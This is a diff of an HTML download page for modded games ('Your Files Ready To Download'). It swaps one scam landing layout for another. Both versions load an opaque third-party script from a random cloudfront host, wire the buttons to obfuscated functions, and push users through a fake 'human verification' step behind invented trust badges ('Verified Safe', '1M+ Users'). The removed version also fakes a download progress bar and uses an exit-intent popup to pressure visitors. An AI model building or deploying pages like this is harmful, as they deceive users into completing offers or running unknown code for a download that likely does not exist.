@@ -1,249 +1,200 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Mod Games Hub</title>
-  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
-<script type="text/javascript">
-    var SnFYo_APt_yocLOc={"it":4399727,"key":"418d8"};
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Game Mod Download Portal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+	<script type="text/javascript">
+    var zbCbx_CYE_VZmdwc={"it":4302765,"key":"a7b81"};
 </script>
-<script src="https://dojy0dg181308.cloudfront.net/3263d16.js"></script>
-  <style>
-    /* Custom styles to replicate React JSX structure and effects */
-    body {
-      font-family: 'Arial', sans-serif;
-      background: linear-gradient(135deg, #2e3b4e, #1f2a37);
-    }
-
-    /* Progress bar */
-    .progress-bar {
-      width: 100%;
-      height: 8px;
-      background-color: #374151;
-      border-radius: 9999px;
-      overflow: hidden;
-    }
-
-    .progress-bar-fill {
-      height: 100%;
-      background-color: #29b6f6; /* Electric blue */
-      width: 0%;
-      transition: width 0.5s ease;
-    }
-
-    /* Popup */
-    .popup {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background-color: rgba(0, 0, 0, 0.7);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      z-index: 50;
-      display: none;
-    }
-
-    .popup-content {
-      background-color: #111;
-      padding: 20px;
-      border-radius: 15px;
-      width: 90%;
-      max-width: 420px;
-      position: relative;
-      text-align: center;
-      color: white;
-      box-shadow: 0px 4px 20px rgba(0, 0, 0, 0.6);
-    }
-
-    .popup .close-btn {
-      position: absolute;
-      top: 10px;
-      right: 10px;
-      cursor: pointer;
-      color: white;
-    }
-
-    /* Button Hover/Active effects */
-    .pulse-button {
-      animation: pulse 1.5s infinite;
-    }
-
-    @keyframes pulse {
-      0% {
-        transform: scale(1);
-      }
-      50% {
-        transform: scale(1.05);
-      }
-      100% {
-        transform: scale(1);
-      }
-    }
-
-    /* Button neon glow effect on hover */
-    .neon-button {
-      background: linear-gradient(45deg, #29b6f6, #64ffda);
-      color: white;
-      border: 2px solid transparent;
-      border-radius: 10px;
-      padding: 16px 32px;
-      font-weight: bold;
-      font-size: 16px;
-      cursor: pointer;
-      position: relative;
-      overflow: hidden;
-      box-shadow: 0 0 8px rgba(41, 182, 246, 0.8);
-      transition: all 0.3s ease;
-    }
-
-    .neon-button:hover {
-      box-shadow: 0 0 30px rgba(41, 182, 246, 1);
-      background: linear-gradient(45deg, #64ffda, #29b6f6);
-    }
-
-    .neon-button:active {
-      box-shadow: 0 0 40px rgba(41, 182, 246, 0.9);
-    }
-
-    /* Mobile responsiveness */
-    @media (max-width: 640px) {
-      .popup-content {
-        width: 80%;
-      }
-
-      .progress-bar {
-        height: 6px;
-      }
-    }
-  </style>
-</head>
-<body>
-
-  <div class="min-h-screen flex flex-col justify-center items-center p-6">
-
-    <!-- Main Landing Page Container -->
-    <div class="bg-gray-800 shadow-2xl rounded-2xl p-8 max-w-md w-full">
-      <h1 class="text-3xl font-bold text-center text-white mb-6">
-        Mod Games Download
-      </h1>
-
-      <!-- Download Section -->
-      <div class="bg-gray-700 border-2 border-gray-600 rounded-lg p-6 text-center">
-        <h2 class="text-2xl font-semibold text-indigo-500 mb-4">
-          Apk Mod Game is Ready!
-        </h2>
-
-        <button id="downloadButton" class="w-full py-3 rounded-lg text-white font-bold transition-all duration-300 neon-button pulse-button" onclick="_Cd()">
-          Unlock Game Mod Now!
-          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" class="inline-block ml-2" width="20" height="20">
-            <path d="M10 14l2-2 2 2M12 10v4m-9 8h18a2 2 0 0 0 2-2V4a2 2 0 0 0-2-2H3a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2z" />
-          </svg>
-        </button>
-
-        <!-- Download Progress Bar -->
-        <div id="progressContainer" class="mt-4 progress-bar hidden">
-          <div id="progressBar" class="progress-bar-fill"></div>
-        </div>
-      </div>
-      <!-- Download Guide -->
-      <div class="mt-6">
-        <h3 class="text-xl font-semibold text-white mb-4">
-          Download Guide
-        </h3>
-        <ul class="space-y-3 text-white">
-          <li class="flex items-center"><span class="text-green-500">✔️</span> Click 'Unlock Game Mod Now' button</li>
-          <li class="flex items-center"><span class="text-green-500">✔️</span> Complete quick verification</li>
-          <li class="flex items-center"><span class="text-green-500">✔️</span> Wait for verification process</li>
-          <li class="flex items-center"><span class="text-green-500">✔️</span> Download starts automatically</li>
-        </ul>
-      </div>
-
-      <!-- Trust Indicators -->
-      <div class="mt-6 flex justify-center space-x-4 text-gray-300">
-        <div class="flex items-center">
-          <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="none" stroke="currentColor" class="mr-2">
-            <path d="M12 5V3m0 4V5m0 4V9m0 4V13m0 4V17m0 4V21" />
-          </svg>
-          <span>Secure</span>
-        </div>
-        <div class="flex items-center">
-          <span class="text-green-500">✔️</span>
-          <span>Verified</span>
-        </div>
-      </div>
-    </div>
-    <!-- Exit-Intent Popup -->
-    <div id="exitPopup" class="popup">
-      <div class="popup-content">
-        <span id="closePopup" class="close-btn">✖️</span>
-        <h2 class="text-2xl font-bold text-indigo-500 mb-4">
-          Wait! Don't Miss Out
-        </h2>
-        <p class="text-white mb-6">
-          Apk Mod Game is Ready now!
-        </p>
-        <button id="continueDownloadButton" class="w-full py-3 neon-button" onclick="_Cd()">
-          Continue to Download
-        </button>
-      </div>
-    </div>
-
-    <footer class="mt-6 text-center text-gray-500">
-      © 2024 Mod Games Hub - All rights reserved
-    </footer>
-  </div>
-
-  <!-- JS to handle functionality -->
-  <script>
-    let downloadProgress = 0;
-    let isDownloading = false;
-
-    // Handle button click to start download
-    document.getElementById('downloadButton').addEventListener('click', () => {
-      startDownload();
-    });
-
-    // Simulate download progress
-    function startDownload() {
-      isDownloading = true;
-      document.getElementById('downloadButton').disabled = true;
-      document.getElementById('progressContainer').classList.remove('hidden');
-
-      let interval = setInterval(() => {
-        downloadProgress += 10;
-        document.getElementById('progressBar').style.width = downloadProgress + '%';
-
-        if (downloadProgress >= 100) {
-          clearInterval(interval);
-          setTimeout(() => {
-            isDownloading = false;
-            document.getElementById('downloadButton').disabled = false;
-          }, 1000);
+<script src="https://d26h1wdc757l2w.cloudfront.net/eaa845c.js"></script>
+    <style>
+        :root {
+            --primary-color: #8b5cf6;
+            --secondary-color: #6366f1;
+            --accent-color: #f472b6;
+            --bg-dark: #0f172a;
+            --bg-darker: #020617;
         }
-      }, 500);
-    }
 
-    // Show exit intent popup
-    document.addEventListener('mouseleave', (e) => {
-      if (e.clientY <= 0) {
-        document.getElementById('exitPopup').style.display = 'flex';
-      }
-    });
+        body {
+            background: radial-gradient(circle at top right, var(--bg-dark), var(--bg-darker));
+            font-family: 'Inter', system-ui, sans-serif;
+            min-height: 100vh;
+            margin: 0;
+            padding: 0;
+        }
 
-    // Close the popup
-    document.getElementById('closePopup').addEventListener('click', () => {
-      document.getElementById('exitPopup').style.display = 'none';
-    });
+        .glass-effect {
+            background: rgba(30, 41, 59, 0.7);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
 
-    // Continue download from the popup
-    document.getElementById('continueDownloadButton').addEventListener('click', () => {
-      startDownload();
-      document.getElementById('exitPopup').style.display = 'none';
-    });
-  </script>
+        .progress-container {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            background: linear-gradient(90deg, var(--accent-color), var(--primary-color));
+            height: 8px;
+            transition: width 0.5s ease-out;
+        }
+
+        .download-btn {
+            position: relative;
+            overflow: hidden;
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            touch-action: manipulation;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .download-btn::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
+            transform: rotate(45deg);
+            animation: shine 3s infinite;
+        }
+
+        @keyframes shine {
+            0% { transform: translateX(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) rotate(45deg); }
+        }
+
+        .step-card {
+            transform: translateY(0);
+            transition: all 0.3s ease;
+        }
+
+        @media (hover: hover) {
+            .step-card:hover {
+                transform: translateY(-5px);
+            }
+        }
+
+        .checkmark {
+            transform: scale(0);
+            opacity: 0;
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .step-completed .checkmark {
+            transform: scale(1);
+            opacity: 1;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .pulse-effect {
+            animation: pulse 2s infinite;
+        }
+
+        /* Mobile-specific styles */
+        @media (max-width: 640px) {
+            .container-padding {
+                padding: 1rem;
+            }
+            
+            .mobile-text {
+                font-size: clamp(1.5rem, 8vw, 2.5rem);
+            }
+
+            .mobile-button {
+                padding: 1rem;
+                font-size: 1.1rem;
+            }
+
+            .mobile-stack > * + * {
+                margin-top: 0.75rem;
+            }
+        }
+
+        /* Custom scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: rgba(30, 41, 59, 0.5);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--primary-color);
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen p-4 sm:p-6">
+    <div class="w-full max-w-xl glass-effect rounded-3xl shadow-2xl overflow-hidden">
+        <div class="p-4 sm:p-8">
+            <div class="text-center mb-6 sm:mb-8">
+                <h1 class="mobile-text text-4xl sm:text-5xl font-black text-transparent bg-clip-text bg-gradient-to-r from-pink-500 via-purple-500 to-indigo-500 mb-2 sm:mb-4 leading-tight">
+                    Your Files Ready To Download
+                </h1>
+            </div>
+
+            <div class="bg-gray-800/50 rounded-xl sm:rounded-2xl p-4 sm:p-8 mb-6 sm:mb-8 shadow-lg">
+                <button id="downloadBtn" class="download-btn mobile-button w-full py-4 sm:py-5 rounded-xl text-white font-bold bg-gradient-to-r from-pink-500 via-purple-500 to-indigo-500 hover:from-pink-600 hover:via-purple-600 hover:to-indigo-600 shadow-lg transform active:scale-[0.98] transition-all duration-300" onclick="_MS()">
+                    <span class="flex items-center justify-center space-x-2 sm:space-x-3">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 sm:h-7 sm:w-7" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
+                        </svg>
+                        <span class="text-lg sm:text-xl" onclick="_MS()">Download Now</span>
+                    </span>
+                </button>
+
+                <div id="progressContainer" class="progress-container mt-4 sm:mt-6 hidden">
+                    <div id="progressBar" class="progress-bar w-0"></div>
+                </div>
+            </div>
+
+            <div class="grid gap-3 sm:gap-4 mb-6 sm:mb-8 mobile-stack">
+                <div class="step-card glass-effect p-4 sm:p-5 rounded-xl flex items-center space-x-3 sm:space-x-4">
+                    <div class="h-8 w-8 sm:h-10 sm:w-10 rounded-full bg-purple-500/20 flex items-center justify-center flex-shrink-0">
+                        <span class="checkmark text-purple-400 text-lg sm:text-xl">✓</span>
+                    </div>
+                    <span class="text-gray-200 text-base sm:text-lg">Click Download Button</span>
+                </div>
+                <div class="step-card glass-effect p-4 sm:p-5 rounded-xl flex items-center space-x-3 sm:space-x-4">
+                    <div class="h-8 w-8 sm:h-10 sm:w-10 rounded-full bg-purple-500/20 flex items-center justify-center flex-shrink-0">
+                        <span class="checkmark text-purple-400 text-lg sm:text-xl">✓</span>
+                    </div>
+                    <span class="text-gray-200 text-base sm:text-lg">Complete Quick Human Verification</span>
+                </div>
+                <div class="step-card glass-effect p-4 sm:p-5 rounded-xl flex items-center space-x-3 sm:space-x-4">
+                    <div class="h-8 w-8 sm:h-10 sm:w-10 rounded-full bg-purple-500/20 flex items-center justify-center flex-shrink-0">
+                        <span class="checkmark text-purple-400 text-lg sm:text-xl">✓</span>
+                    </div>
+                    <span class="text-gray-200 text-base sm:text-lg">Downloading Start</span>
+                </div>
+            </div>
+
+            <div class="flex flex-col sm:flex-row justify-center items-center space-y-3 sm:space-y-0 sm:space-x-8">
+                <div class="flex items-center glass-effect px-4 py-2 rounded-xl w-full sm:w-auto justify-center">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2 text-green-400" viewBox="0 0 20 20" fill="currentColor">
+                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd" />
+                    </svg>
+                    <span class="text-gray-300">Verified Safe</span>
+                </div>
+                <div class="flex items-center glass-effect px-4 py-2 rounded-xl w-full sm:w-auto justify-center">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2 text-blue-400" viewBox="0 0 20 20" fill="currentColor">
+                        <path d="M9 6a3 3 0 11-6 0 3 3 0 016 0zM17 6a3 3 0 11-6 0 3 3 0 016 0zM12.93 17c.046-.327.07-.66.07-1a6.97 6.97 0 00-1.5-4.33A5 5 0 0119 16v1h-6.07zM6 11a5 5 0 015 5v1H1v-1a5 5 0 015-5z"/>
+                    </svg>
+                    <span class="text-gray-300">1M+ Users</span>
+                </div>
+            </div>
+        </div>
+    </div>
 </body>
 </html>
